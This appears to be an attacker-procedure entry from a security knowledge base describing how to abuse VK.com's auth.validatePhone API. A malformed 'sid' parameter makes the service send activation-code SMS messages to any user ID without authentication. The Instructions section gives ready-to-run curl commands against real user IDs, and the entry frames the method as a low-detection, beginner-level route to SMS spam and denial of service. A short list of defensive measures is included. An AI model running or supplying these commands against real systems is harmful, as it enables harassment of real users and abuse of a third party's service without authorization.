---
id: proc-vk-sms-spam-001
tags:
  - api-vulnerability
  - input-validation
  - sms-spam
  - vk.com
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/vk-auth-validatephone-sms-spam]]'
  - '[[commands/vk-auth-validatephone-unicode-sms]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T17:32:01.683Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Network Denial of Service]]'
---
# Trigger-Unauthorized-SMS-Via-Malformed-SID

## Summary

This procedure exploits the improper validation of the 'sid' parameter in VK.com's auth.validatePhone API, allowing attackers to send unauthorized SMS activation codes to any user by crafting a malformed sid in the format '2fa_<userId>_<arbitraryText>', bypassing expected appId and hash validation.

## Description

The auth.validatePhone method is intended for phone validation during authentication but fails to enforce the full sid format '2fa_$userId_$appId_$hash'. By replacing the appId and hash with arbitrary text (e.g., 'lolka' or Unicode strings like 'блаблабла'), attackers can trigger SMS sends without authentication. This works even if the target has 2FA disabled, as the API does not check 2FA status before executing the action. The attack requires only the target's user ID, obtainable from public profiles, and can be repeated for spam.

## Requirements

1. Access to the internet and ability to make HTTPS requests to api.vk.com
2. Knowledge of target user ID (e.g., 23048942)
3. No credentials or API keys required

## Defense

Defensive measures and detection strategies:

- Enforce strict sid format validation on the server side, rejecting any sid not matching the exact pattern
- Implement rate limiting on auth.validatePhone calls per IP or user ID to prevent spam
- Log and monitor anomalous sid patterns or high-volume SMS/voice triggers
- Require authentication for all phone validation endpoints

## Objectives

1. Send unauthorized SMS to a specified VK.com user
2. Validate sid acceptance of arbitrary text, including Unicode
3. Demonstrate potential for SMS spam DoS

## Instructions

### Step 1: Prepare Malformed SID for Basic SMS Trigger

**Context**: Craft a sid that starts with '2fa_<userId>_ ' followed by arbitrary text to bypass validation.

**Command** ([[commands/vk-auth-validatephone-sms-spam]]):
```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_23048942_lolka"
```

> This sends a GET request to the API with the malformed sid. Expected output is a JSON response with error code 0 or success, triggering an SMS to user 23048942 containing an activation code.

### Step 2: Test with Unicode Arbitrary Text

**Context**: Confirm the flaw accepts non-ASCII text to ensure broad exploitability.

**Command** ([[commands/vk-auth-validatephone-unicode-sms]]):
```bash
curl "https://api.vk.com/method/auth.validatePhone?sid=2fa_66748_блаблабла"
```

> Similar to Step 1, this triggers an SMS to user 66748. Success is indicated by no validation error and SMS delivery.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques

- None

## Commands Used

- [[commands/vk-auth-validatephone-sms-spam]]
- [[commands/vk-auth-validatephone-unicode-sms]]

## Tools Used

- None

## Tags

- [[api-vulnerability]]
- [[input-validation]]
- [[sms-spam]]
